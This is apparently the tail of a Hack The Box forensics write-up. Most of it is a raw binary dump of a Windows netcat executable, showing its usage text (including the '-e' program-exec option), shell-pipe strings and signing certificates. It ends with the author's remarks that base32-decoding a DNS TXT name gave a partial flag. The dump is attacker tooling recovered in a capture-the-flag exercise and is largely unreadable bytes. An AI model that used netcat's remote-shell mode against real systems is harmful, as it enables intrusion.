@èÖÿÿ¸ÉÃÿ%eÿ%veÿ%îdÿ%îdÿ%îdÿ%eÿ%fdÿ%¾dÿ%Ndÿ%^dÿ%Feÿ%feÿ%.eÿ%Ndÿ%ndÿ%Fdÿ%dÿ%Îdÿ%¶dÿ%6dÿ%&eÿ%ndÿ%&dÿ%¶gÿ%&gÿ%gÿ%vgÿ%îfÿ%Îfÿ%Îfÿ%6gÿ%gÿ%.gÿ%îfÿ%gÿ%öfÿ%gÿ%Þfÿ%fÿ%>gÿ%&gÿ%fÿ%fÿ%Þfÿ%¶fÿ%æfÿ%ffÿ%Þfÿ%NfHì(Òtút¸HÄ(Ãfè«¸HÄ(ÃVSHì(=#t
Çútút?HÄ(¸[^ÃH~H5~H9ótàHHÀtÿÐHÃH9óuíHÄ(¸[^Ãè9ëºHì1ÀHÄÃHìHdHÄÿàHìHÈHÄÃ@HìHÈHÄÃSHËHì0H
YYèÌÿÿÿHøÿHD$(tv¹èH
8Yè«ÿÿÿH
4YHD$(èÿÿÿHT$(LD$ HÙHD$ èkHL$(HÃèÿÿÿHL$ HòXèuÿÿÿ¹HéXèDHØHÄ0[ÃHÙÿcHÃHÄ0HØ[ÃfDHì(èGÿÿÿHøÀHÄ(ÃHìhH\$@Ht$HH|$PHl$XLd$`9vnH=HqLa HiHyèÓH=HH`IñIØLd$0Hl$(H|$ èÎ1ÀH\$@Ht$HH|$PHl$XLd$`HÄhÃfDHk=HcHÿàH<ë@H)<étÿÿÿ@H8<édÿÿÿ@HI<éTÿÿÿ@H©<éDÿÿÿ@Hq<é4ÿÿÿHì1ÀHÄÃVSHËHì8HD$XHT$XLD$`LL$hHD$(èáH
â<LH`A¸ºèvHt$(è¼HH`HÚIðèè HìMÀH\$`Ht$hLÃH|$pHl$xHÎL¤$L¬$H×L´$u4H\$`Ht$hH|$pHl$xL¤$L¬$L´$HÄÃHT$ A¸0ÿv`HÀD$DøuIØHúHñèÂëø@tãLd$\A¸@HT$8HL$ H-#`MáÿÕD$DIØHúHñø@AÅøAÆèrEöBÿÿÿEí9ÿÿÿMáDD$\HT$8HL$ ÿÕé ÿÿÿH
¨;Iðº0èkþÿÿff.HìXDKH\$0Ht$8H|$@Hl$HEÀLd$Pt'H\$0Ht$8H|$@Hl$HLd$PHÄXÃfHé;Hâ;Ç8KHÂH)ÚHú~µHú~w-À;íu=º;ÿtRfH9ÃH5¦;sH-ÿÿH|$,KA¸HúHéHÃD$,èðýÿÿH9órÛéOÿÿÿfD5b;öuH[;ÉuSÒuSúHÃH=+;H9ÃÿÿÿH5ÿÿHl$ I¼ÿÿÿÿKDCA¶ÀHñøLtcw"øüH
¡:A¶ÐHÇD$ èïüÿÿø ¦ø@uÙI)ÑI)ñL	LL$ A¸Hêè%ýÿÿHÃH9ßwéþÿÿD·A÷ÂMÐt0IÊÿÿI)ÑI)òOLT$ A¸HêèÜüÿÿëµf.I)ÑI)ðøOLD$ tÒwzøuA¸Hêè§üÿÿëDDA÷ÂMÐtÁM	âI)ÑI)òOLT$ A¸HêèqüÿÿéGÿÿÿD¶AöÂMÐtIÊÿÿÿI)ÑI)òOLT$ ëø t¼ø@
ÿÿÿféøþÿÿH
,9è¿ûÿÿSHì =Àw6=Àr[»1Ò¹èHøHÂ"1ÀHÒHÄ [Ã=Àvo=À¦=À©1ÀHÄ [Ã=Àws=t~=ÀuÜ1Ò¹èHøHÂÌHÒ¸t¹ÿÒ¸ÿÿÿÿë@=Àt;=ÀCÿÿÿ1Àëf.1Ûé3ÿÿÿf=Àt=Àeÿÿÿ¸ÿÿÿÿHÄ [Ã1Ò¹è
HøHÂt]HÒ¸ÿÿÿ¹ÿÒ¸ÿÿÿÿéúþÿÿ¹ÿÒ¸ÿÿÿÿééþÿÿ¹èQ
ÛtèhÈÿéÎþÿÿ¹è6
Èÿé¼þÿÿ¹è$
Èÿéªþÿÿfff.HìXHt$0H\$(H|$8Hl$@Ld$HLl$PèIHÆ°IHöu+H\$(Ht$0H|$8Hl$@Ld$HLl$PHÄXÃÀuÑH
u7ÇkIè¶HÅ¸Híu®HÒFHè¹0HCHD%¼ýÿÿAõH×óH«HßHÝA)ô1Û± óH«H×ë-ÆE	PHÃDePèD)èHÅGWHÇHû t!HÙèùHÀuÆHÛu¸é*ÿÿÿDIðÚH
DFÿòY¸é	ÿÿÿHìÛãHÄÃHìhH¸2¢ß-+H\$@HVHt$HH|$PHl$XLd$`H9ÃHÇD$0t(H÷ÓH:H\$@Ht$HH|$PHl$XLd$`HÄhÃHL$0ÿ%YLd$0ÿâXÅÿâXÇíÿYHL$ Æÿÿ)YL3d$ öH¸ÿÿÿÿÿÿI1ìI1üI1ôI!ÄLàI9ÜH÷ÐtL%¦H¯épÿÿÿf.H¸Ì] ÒfÔÿÿI¼3¢ß-+ëÍf.UHåVHÎH
±GSHìpÿÂXHHHUèE1ÀHÙè	HÀIÁ¤HEàHUèIØ1ÉHÇD$8HD$0HEØHD$(HYGHD$ è×H@H1ÉH5¿GÇL	ÀÇLHLHÍHEÀHÒHEÈÿ<XH
ÿWXÿWº	ÀHÁÿ+XèòfHEHÍGHEHbGévÿÿÿHì(HEHHÀtÿÐH4HPH@H%HÀuãHÄ(Ãff.VSHì(H3øÿÃt,ÛtH5!ØÿÆëuöHÄ(H
ÿÿÿ[^é$õÿÿ@1ÛH5÷ëDÃCÂH<Öuòë´HìKÀtHÄÃÇKHÄézÿÿÿHìHKH\$(Ht$0H|$8Hl$@ÀuH\$(Ht$0H|$8Hl$@HÄHÃDH
iKÿVHKHÛt;H=äVH55Vfÿ×HÅÿÖÀuHít	HCHéÿÐH[HÛuÜHAVH\$(H
	KHt$0H|$8Hl$@HÄHÿà@Hì8ÆJH\$ Ht$(HÓH|$0ÎÀu1ÀH\$ Ht$(H|$0HÄ8Ãº¹èùHÇ¸ÿÿÿÿHÿtÈH
J7H_ÿ=UH¢JH
sJH=JHGÿU1Àëfffff.SËHì #JÀu1ÀHÄ [ÃH
)JÿßTHDJHÀt9ÚuëK9Út)HÈHHHÉuîH
öIÿU1ÀHÄ [ÃHQHPèSH
ÌIÿòTëÔHPHÁHÞIëÜ@Hì(útGrúuèëýÿÿ¸HÄ(ÃèÛýÿÿeIøuåH
yIÇOIÿ
TëÌ:IÀtÇ,I¸HÄ(ÃfH
9IÿWTëÛHì1Àf9MZtHÄÃHcQ<HÑ9PEuì1ÀfyÀHÄÃffffff.HìHcA<HÁ1ÀD·QD·AEÒt7E·ÀJD1ÉëHÀ(D@EÁI9Ñw	D@L9Âr
ÁD9Ñrß1ÀHÄÃHìHH\$(Ht$01ÛH|$8Hl$@HÎèHøvHØHt$0H\$(H|$8Hl$@HÄHÃf=cÿÿMZuÙHcÿÿHSÿÿH8PEu¿fxu··h·Pít«·Ò1ÿH\ëHÃ(A¸HòHÙè[À{ÿÿÿÇ9ïrÜ1ÛémÿÿÿDHì1Àf=áÿÿMZtHÄÃf.LcÿÿHÂÿÿI:PEu×fzuÏD·BD·JEÀtÀE·ÉJD
1ÒëfHÀ(ö@' t	HÉt¢HéÂD9Ârå1ÀëHì1Àf=aÿÿMZHZÿÿtHÄÃHc
ÿÿHÑ9PEuæfyHDÂëÚfS1ÛH&ÿÿHì f=ÿÿMZtØHÄ [ÃHcDÿÿHÂ:PEuæfzuÞHÊHÁH)Âè×ýÿÿHÀtËX$HÄ ÷ÓÁëØ[Ãÿ%Rÿ%¦Rÿ%Rÿ%fRÿ%Rÿ%NRÿ%^Rÿ%fRÿ%VRHD$Ã1ÀHkSÿ HìHÄéHìHÄéÓûÿÿHìHÒt	HÄéûÿÿ1ÀHÄÃÿ%FRÿ%Rÿ%.Rÿ%Sÿ%þRÿ%VSÿ%.Rÿ%Rÿ%6Rÿ%Rÿ%öRÿ%ÖQÿ%¦Rÿ%Sÿ%Sÿ%nRÿ%vRÿ%Rÿ%ÖQÿ%æQÿ%þQÿ%FRÿ%.Rÿ%~Rÿ%¶Rÿ%ÆRÿ%öQÿ%vRÿ%^Rÿ%®Qÿ%nRÿ%.Rÿ%Rÿ%öQÿ%VRÿ%>Rÿ%Qÿ%fQÿ%VQÿ%ÞPÿ%vQÿ%NRÿ%nQÿ%vQÿ%NQÿ%6Pÿ%&Pÿ%ÎOÿ%Oÿ%FOÿ%FOÿ%vOÿ%Oÿ%¦Oÿ%ÞOÿ%Oÿ%Oÿ%æNÿ%¶Oÿ%FOÿ%¶Nÿ%.Oÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ?ÿÿÿÿ(UNKNOWN)tcpudp sent %d, rcvd %d0123456789abcdef  a@ÿÿÿÿÿÿÿÿÿ¹@ ´@øu@2¢ß-+Í] ÒfÔÿÿmsvcr80.dllmsvcr70.dllmsvcrt.dll_set_invalid_parameter_handlerPOSIXLY_CORRECT--%s: option `%s' is ambiguous
%s: option `--%s' doesn't allow an argument
%s: option `%c%s' doesn't allow an argument
%s: option `%s' requires an argument
%s: unrecognized option `--%s'
%s: unrecognized option `%c%s'
%s: illegal option -- %c
%s: invalid option -- %c
%s: option requires an argument -- %c
Failed to create shell stdout pipe, error = %sFailed to create shell stdin pipe, error = %sFailed to execute shellFailed to create ReadShell session thread, error = %sWaitForMultipleObjects error: %sFailed to execute shell, error = %sSessionReadShellThreadFn exitted, error = %sexit
INTR          BADF          ACCES         FAULT         INVAL         MFILE         WOULDBLOCK    INPROGRESS    ALREADY       NOTSOCK       DESTADDRREQ   MSGSIZE       PROTOTYPE     NOPROTOOPT    PROTONOSUPPORTSOCKTNOSUPPORTOPNOTSUPP     PFNOSUPPORT   AFNOSUPPORT   ADDRINUSE     ADDRNOTAVAIL  NETDOWN       NETUNREACH    NETRESET      CONNABORTED   CONNRESET     NOBUFS        ISCONN        NOTCONN       SHUTDOWN      TOOMANYREFS   TIMEDOUT      connection refusedLOOP          NAMETOOLONG   HOSTDOWN      HOSTUNREACH   NOTEMPTY      PROCLIM       USERS         DQUOT         STALE         REMOTE        DISCON        SYSNOTREADY    VERNOTSUPPORTEDNOTINITIALISED HOST_NOT_FOUND TRY_AGAIN      NO_RECOVERY    NO_DATA        unknown socket error: %s
 punt!spurious timer interrupt!Hmalloc %d failedDNS fwd/rev mismatch: %s != %sgethostpoop fuxoredCan't parse %s as an IP address%s: forward host lookup failed: h_errno %dWarning: inverse host lookup failed for %s: h_errno %d%s: inverse host lookup failed: h_errno %dWarning: forward host lookup failed for %s: h_errno %dWarning: port-bynum mismatch, %d != %d%dloadports: no block?!loadports: bogus values %d, %dCan't get socketnnetfd reuseaddr failedretrying local %s:%dCan't grab %s:%d with bindWarning: source routing unavailable on this machine, ignoringUDP listen needs -p arglocal listen fuxoredlocal getsockname failedlistening on [any] %d ...post-rcv getsockname failedinvalid connection to [%s] from %s [%s] %dconnect to [%s] from %s [%s] %dudptest first write failed?! errno %doprint called with no open fd?!%8.8x ofd write errselect fuxorednet timeout
Preposterous Pointers: %d, %dtoo many output retriesCmd line: wrongall-A-records NIYinvalid hop pointer %d, must be multiple of 4 <= 28too many -g hopsinvalid interval time %sinvalid local port %sinvalid wait-time %snc -h for helpade:g:G:hi:lLno:p:rs:tcuvw:zcan't open %sinvalid port %sno connectionno destinationno port[s] to connect to%s [%s] %d (%s) open%s [%s] %d (%s)sent %d, rcvd %dsºÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿHºÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿJ½ÿÿºÿÿJ½ÿÿ¼ÿÿeºÿÿ5ºÿÿJ½ÿÿ¯ºÿÿ:»ÿÿN»ÿÿJ½ÿÿJ½ÿÿ£»ÿÿJ½ÿÿ¹»ÿÿÏ»ÿÿó»ÿÿJ½ÿÿ1¼ÿÿG¼ÿÿw¼ÿÿ£¼ÿÿ¹¼ÿÿÏ¼ÿÿJ½ÿÿJ½ÿÿ7½ÿÿ[v1.12 NT http://eternallybored.org/misc/netcat/]
connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
listen for inbound:	nc -l -p port [options] [hostname] [port]
options:	-d		detach from console, background mode
	-e prog		inbound program to exec [dangerous!!]	-g gateway	source-routing hop point[s], up to 8
	-G num		source-routing pointer: 4, 8, 12, ...
	-h		this cruft
	-i secs		delay interval for lines sent, ports scanned
	-l		listen mode, for inbound connects
	-L		listen harder, re-listen on socket close
	-n		numeric-only IP addresses, no DNS
	-o file		hex dump of traffic
	-p port		local port number
	-r		randomize local and remote ports
	-s addr		local source address	-t		answer TELNET negotiation	-c		send CRLF instead of just LF
	-u		UDP mode
	-v		verbose [use twice to be more verbose]
	-w secs		timeout for connects and final net reads
	-z		zero-I/O mode [used for scanning]port numbers can be individual or ranges: m-n [inclusive]Argument domain error (DOMAIN)Argument singularity (SIGN)Overflow range error (OVERFLOW)Partial loss of significance (PLOSS)Total loss of significance (TLOSS)The result is too small to be represented (UNDERFLOW)Unknown error_matherr(): %s in %s(%g, %g)  (retval=%g)
Âÿÿ¬Âÿÿ¼ÂÿÿÌÂÿÿÜÂÿÿìÂÿÿÂÿÿMingw-w64 runtime failure:
  VirtualQuery failed for %d bytes at address %p  Unknown pseudo relocation protocol version %d.
  Unknown pseudo relocation bit size %d.
.pdatadÀ¬ÏdÄ¬ÁàÏ¬ÅüÁ°ÐüÅÃ$ÑÇdÈrÈÈÈ¢ÈºÈÐÈâÈúÈÉÉ*É@ÉVÉfÉzÉÉÉ®ÉÈÉØÉôÉÊÊ,ÊFÊRÊhÊ|ÊÊªÊÈÊÐÊäÊöÊË Ë2ËBË\ËhËrËzËËËËË¨Ë´Ë¾ËÌËÜËèËöËÌÌ,Ì6ÌDÌNÌXÌbÌnÌxÌÌÌÌ ÌªÌ´Ì¾ÌÆÌÎÌØÌàÌêÌôÌüÌÍÍÍ Í*Í4Í>ÍHÍRÍZÍdÍnÍvÍÍÍÍÍ¨Í²Í¼ÍÈÍÖÍèÍúÍÎÎ"Î*Î8ÎBÎRÎbÎrÎÎÎÎ¤Î°ÎºÎÂÎÊÎÖÎàÎèÎöÎÏdÈrÈÈÈ¢ÈºÈÐÈâÈúÈÉÉ*É@ÉVÉfÉzÉÉÉ®ÉÈÉØÉôÉÊÊ,ÊFÊRÊhÊ|ÊÊªÊÈÊÐÊäÊöÊË Ë2ËBË\ËhËrËzËËËËË¨Ë´Ë¾ËÌËÜËèËöËÌÌ,Ì6ÌDÌNÌXÌbÌnÌxÌÌÌÌ ÌªÌ´Ì¾ÌÆÌÎÌØÌàÌêÌôÌüÌÍÍÍ Í*Í4Í>ÍHÍRÍZÍdÍnÍvÍÍÍÍÍ¨Í²Í¼ÍÈÍÖÍèÍúÍÎÎ"Î*Î8ÎBÎRÎbÎrÎÎÎÎ¤Î°ÎºÎÂÎÊÎÖÎàÎèÎöÎÏ6CloseHandlehCreatePipeiCreateProcessAsCreateThreadDeleteCriticalSectionDisconnectNamedPipeDuplicateHandleEnterCriticalSection¿ExitThreadúFreeConsoleGGetCurrentProcessHGetCurrentProcessIdKGetCurrentThreadIduGetLastErrorGetModuleHandleA¤GetProcAddress»GetStartupInfoA½GetStdHandleÎGetSystemTimeAsFileTimeãGetTickCount'InitializeCriticalSectionOLeaveCriticalSectionPLoadLibraryAPeekNamedPipe¡QueryPerformanceCounter³ReadFileÑRtlAddFunctionTableÒRtlCaptureContextÙRtlLookupFunctionEntryàRtlVirtualUnwindRSetUnhandledExceptionFilter^SleepfTerminateProcessgTerminateThreadmTlsGetValuevUnhandledExceptionFilterVirtualProtectVirtualQueryWaitForMultipleObjects¬WriteFile_close	_dup(_itoa,_kbhit6_open<_readK_strcmpiP_strnicmpi_writeN__dllonexitQ__getmainargsR__initenvS__iob_funcZ__lconv_init`__set_app_typeb__setusermatherrr_acmdlny_amsg_exit_cexitÆ_errnoç_fmode)_initterm-_isatty_lock4_onexitb_setjmpf_setmodeh_sleepÄ_time64Ü_unlock¤abort®atoi²calloc¼exitÁfflushËfprintfÍfputcÒfreeÝfwriteâgetenvägets	longjmp
mallocmemcmpmemcpymemset$rand0signal3sprintf6srand9strcat;strchr<strcmp>strcpyDstrlenGstrncmpHstrncpygvfprintfWSACleanupWSAGetLastErrorWSASetLastErrorWSAStartup"__WSAFDIsSet#accept$bind%closesocket&connect(gethostbyaddr)gethostbyname/getservbyname0getservbyport1getsockname4htons5inet_addr7inet_ntoa9listen;ntohs=recv>recvfromBselectCsendFsetsockoptGshutdownHsocketÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀKERNEL32.dllÀÀÀÀÀÀÀÀÀmsvcrt.dll(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(À(Àmsvcrt.dll<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<À<ÀWSOCK32.dll@`@b@a@`a@Að@Dð@ ±@@à@Ø0È	*H÷
 ¹0µ10	+0h
+7 Z0X03
+70%  ¢<<<Obsolete>>>0!0	+7ê®;èªÐÿy,èÒ&¤â 0
0õ #¬³0
	*H÷
0W10	UBE10U
GlobalSign nv-sa10URoot CA10UGlobalSign Root CA0
990128130000Z
170127120000Z010	UBE10U
GlobalSign nv-sa1%0#UPrimary Object Publishing CA100.U'GlobalSign Primary Object Publishing CA0"0
	*H÷
0
¢u*§º	q$ß¡b)ÜusèßVWiVOòÈ¼Xí&r`õÅUW¹É¡Ôt@ÿlèæS7þ·Úy>¸R8é,3R¦ÍpÎJ]bôÑg^¼JÊ¼ÝG±Íñe[°KkÞÍ.õPè£&k6cApDð_â%uyP}_¡¢FUGÓFhç'ôìAQ÷ÔzáDhqØXo½´Bî
fuFDÒ0c÷DpÊVoX*'.qRmF«§+HdÈRút×E³õxsè
îÄàrª»^Îù´îs½Í£®0«0Uÿ0Uÿ0ÿ0UQy|YùÚÍØÄ:Éx-M03U,0*0( & $"http://crl.globalsign.net/Root.crl0U%0
+0U#0`{fE
ÊP/}Í4¨ÿüýK0
	*H÷
µx¦¢|·É}j¼qú)0`ÂôbþCnâ²sv[}õNI/Ôú·@ïíoTÅ*=
¤Üz½w/Ì@ÁóÄNrº|æÿd+ÇÎl§ü×|FMB;Û?2aW×°³6fð³ýDo7±N§V%õÖmbby\BÓ#üèdE¹-~[N¯Ã)xA4¯ÅýN,\þÇý»%%1Mrµµ)KH7oÇNJE~/1«èR¯Ög4_'jfRÑZÇ¬0, 8Ý+ÿ:ëÎE¢{¡ sV*æQlÜ/00  Áf0
	*H÷
0W10	UBE10U
GlobalSign nv-sa10URoot CA10UGlobalSign Root CA0
090318110000Z
280128120000Z0T10UTimestamping CA10U

GlobalSign1#0!UGlobalSign Timestamping CA0"0
	*H÷
0
Ã·
Mh3Þ6ð<ºõÚÍS{Fòb×Áw»7~OÁ"ÚPÆ©¶=«yT}LÄ,Æ¡¨_:Òd+Ì>zè¤V±»ÏÎ5:4l-Àwµ0©gæ:	D:CrA¢ÃF¶¹§¯ud%çlGõGÞê¢c}õ¨U¢dro¹s?99\Äþû½IcÐC"Ö«tÏ0¾O½ýZßm<ÌZP¹ÂCÂ_íÍ3=ÌÁ [©b;x}d£¬M+×lqT°«±Ö}#Û@7&ÛP¯8=¦uo£é0æ0Uÿ0Uÿ0ÿ0UèÂñÄ2Ü357¼evõ.E,þ0KU D0B0@	+ 20301+%http://www.globalsign.net/repository/03U,0*0( & $"http://crl.globalsign.net/root.crl0U#0`{fE
ÊP/}Í4¨ÿüýK0
	*H÷
]öË+
@zCpjàÅçª×gÉ1eO¨©Ü8j 0
½Ç(îBEÊóÞXE©2õY\jp9'Mõ´F4èS1²³TéÌB«ÕÙY0ûF'%¸#±èu$Èv7{IEH¤íâ]Ò|¢Ü-ºZbe«®Ç4;Ër½$ÜÃv'´§þáX)ò9¦æâX¬~$>ªìç:34Æ;¬«bzº-MKÅ0ðy}<xàøæÒY9+0aè¸øÀ¡é"x}ÄÜ¾À»ár®ëµ@@OïX^Ð¨¬(éº¿0.0 %°´Ì0
	*H÷
0T10UTimestamping CA10U

GlobalSign1#0!UGlobalSign Timestamping CA0
091221093256Z
201222093256Z0R10	UBE10U

GlobalSign NV1+0)U"GlobalSign Time Stamping Authority0"0
	*H÷
0
ÍÂ=]w"ÐÂ}82ÃBj;SfÝj6D
iÏhE~/îB:3|>ÓjØZÕÃM
_Pý¿lÄ¢`ØíR.tÞÆE!{Uöê±dütk²_ÇllC$7IÒH¥¢vIP!Ês
<]µ.ª^M2ËÙÀÀeVÙÅ±?'úIîË0;Å§p[¨«ZþÈö¿]a4XQÿß2êTe+lügíÙÚcÖZ$£t#¡µÑ f£ídI¶ïÑU^©ZÅV¿ë*-5µ761ìÃþz;Â£0þ0U#0èÂñÄ2Ü357¼evõ.E,þ0<U50301 / -+http://crl.globalsign.net/Timestamping1.crl0Uªª¦ï¤dsÖâyÈêÏ¥`)Ê0	U00Uÿ0U%ÿ0
+0KU D0B0@	+ 20301+%http://www.globalsign.net/repository/0
	*H÷
¼ìþæ6U\yÔz¶²m¡VÆUêöíõ+È»Ý`{Gm@>ÂÕ/Ûç®Rhr¡åJ`<øÕ/FØÃ²·S¬lC$$ÑñüéV.4XCêïÿ4tl Àli`Ê»½»vïÇ$°Æ81Ï68¸ .(¹öÊ'Í¬9aWàãZv0õÞ¦=r*`2¨3M53\ó¤ý÷,ákK0õËÓCbøA¹Þ} Ë,ö_5ý3Be6,£ôZ°¹{ÛlË¡øÒ»|Ñ'y¾|;æ§V4ØÉ©0Q09 0z'-0
	*H÷
0c10	UBE10U
GlobalSign nv-sa10U
ObjectSign CA1!0UGlobalSign ObjectSign CA0
110610143733Z
120610135630Z0'10	USI10UJernej Simoncic0"0
	*H÷
0
N¦gÆëð¦øËZçéËj¹"×1ò@B·Ly§
ºcï*rÝçÙfàT4Ó±hÎþåËVÐ%íâkw3ü"øár`/GR¬avè*Þ5¹C¥þf¨þL2|E+'
þD Jdº<ÌØß8â´_OoÒ,ÙÞ:ðÉêýôÐÙÀßelAôrU¨¹µSó¬)åÕgJ
8î®.At5´ï§=}Áé1¯aÂ´SVÖ¦þ^¨\Ä(=5
ç
côç_æD]3µÃØÍU×¥Zþê¯ú¼á~£@0<0U#0Ò[óK&K¥°ç]ýVöñ.8NS 0N+B0@0>+02http://secure.globalsign.net/cacert/ObjectSign.crt09U2000. , *(http://crl.globalsign.net/ObjectSign.crl0	U00Uÿ0U%0
+0KU D0B0@	+ 220301+%http://www.globalsign.net/repository/0	`HøB0
	*H÷
eRÏ$-iú÷£1PØL5ñØãë'Èå¯ÚêªÓ »þ.ó"ôSqK}¡++q/ÈtíV ô¦¯Òi
V%åÀÊÜå©´Æìb0«ÕOO/©rÀ¨ók!øcU£ÂmÕHlCx{z
¾¼:Dn8Xoäy£òÅâø;j#_ã=v:HS_V*·möâTÊk/{x\ûì|ûì±lÏ¥¬øö ï°GB5(Ì§wªÕà¤á@±p	yâbâV¡TD/]1¡t8íGÖ½<h_U>ååè¯ÛÇîV0Ó0» #¯$0
	*H÷
010	UBE10U
GlobalSign nv-sa1%0#UPrimary Object Publishing CA100.U'GlobalSign Primary Object Publishing CA0
040122100000Z
170127100000Z0c10	UBE10U
GlobalSign nv-sa10U
ObjectSign CA1!0UGlobalSign ObjectSign CA0"0
	*H÷
0
°±òpÎìÃ´íÆ	&oßgYÏÞLÂ±EâSuAú6oºp(|mr½%e:	ÿÜú{^78äÇKÍX	ÀÃIX&YõmÆ¹Áû%íØbNÊ
l]pïÎÓ)	Æöî¶Ô<TÌ]à¯ÛÝ#	2{2b
ËzÏ4!¶o6¶±ÎË)5@>X|ÿú¸ÕÊ5ÝËÍWËä¿¨_wð¶ç«ty@!¦céÐ½8´®¬¡ÿsÚ¥E¸MÎ*<ïÔß(u©¨Âä|`ò%ÌæN¶-Öµ4<«Õ8:È=Ä±ùÍ£g0c0Uÿ0Uÿ0ÿ0UÒ[óK&K¥°ç]ýVöñ.8NS 0JU C0A0?	+ 220200+$http://www.globalsign.net/repository09U2000. , *(http://crl.globalsign.net/primobject.crl0N+B0@0>+02http://secure.globalsign.net/cacert/PrimObject.crt0	`HøB0U%0
+0U#0Qy|YùÚÍØÄ:Éx-M0
	*H÷
jómô©"þpe.¡]«30ÝlxúKêÅìzjÅX9kóâ§(Ñ]v|oÄ6C³Á¼1YÏ8Ø£;ÎÿÊgX¿àñ¬a>¢;¼[A¬Dkõ&óí^¨eöÊe¦?Êõwë¥*X)Vø¾@éÒüW,ca7f%9 . 6%½|ë~Ó£ÂÅvu0¹ÿvA5!hÑ^\Ã`æ@üÀ]¢Tnng§¢£+Û·MÿäÕÇåæÕñ®üÍf!ó>GÉåBa,&²¨=É§xßnt,Föré<dk(UÄKd3ËxT8ðÕqÔ>
5à³1¦0¢0r0c10	UBE10U
GlobalSign nv-sa10U
ObjectSign CA1!0UGlobalSign ObjectSign CA0z'-0	+ p0
+7100	*H÷
	1
+70
+710
+70#	*H÷
	1]Ú²ãÓÓ5éo¸MÅV±40
	*H÷
^ìòO½J¢»âËg·Ê£1Ì°Ê/Òô´£ö>.(ümõ¶ßz|ÊSÿå^!&uþKm^TU&µ*xe¬¯`½H#º¢0rzl	¤Ï vÚ·,VÑùÜcª1?²6DHz.2]àÒhº¿olË·Þ5G>õhÁÿWT÷²sý¼ÇYJ,øûâ"*pÃÚäI3(½$
hÜEuïyÓÞï¼×ÍÑµÄçna9BI!ot¬jÜÿ£ÔJgª5,pH+¬êÊÐ+8IçgÚørMY¦©ÆÇóÝð¤¡0	*H÷
	100c0T10UTimestamping CA10U

GlobalSign1#0!UGlobalSign Timestamping CA%°´Ì0	+ ÷0	*H÷
	1	*H÷
0	*H÷
	1
110916225250Z0#	*H÷
	1:¾>´fïâüZ¾\ÀöÝ#ßÜ0*H÷
	1000®ß}÷kº$Ö}ºñ[¡[A~Il0g0X¤V0T10UTimestamping CA10U

GlobalSign1#0!UGlobalSign Timestamping CA%°´Ì0
	*H÷
ÁÚ~"¸ß.rb¶ËHí9$(ÇÆ;U»OðéIªTú.W*+«qÏK=ftþFâÁxª6ÕuØnñá²a°ÆÎÌãB+.zAAÕÚ=M©ñÝe]©ÊSY¬c9ÌÊH-	E´Ù©äèèÏ Æu¯¹pð»QCÃ¸æjG´¼Ò·¤øHmêõè£ßUÜÃoÑøU±ÈZæÅ>cmnå¥jl¡G\</½&r`'¼Øß¯èlëlâ¨¾@PAþ»oÿ>EÉ(a½¶$<$ig·C+Y²ýbY7,P¨J`
```
That was the netcat being downloaded very likely
After many many digging, the key was to decode the TXT name, it looks like a base something, and after tryingin base32 we got:
```
HTB{MAn...
```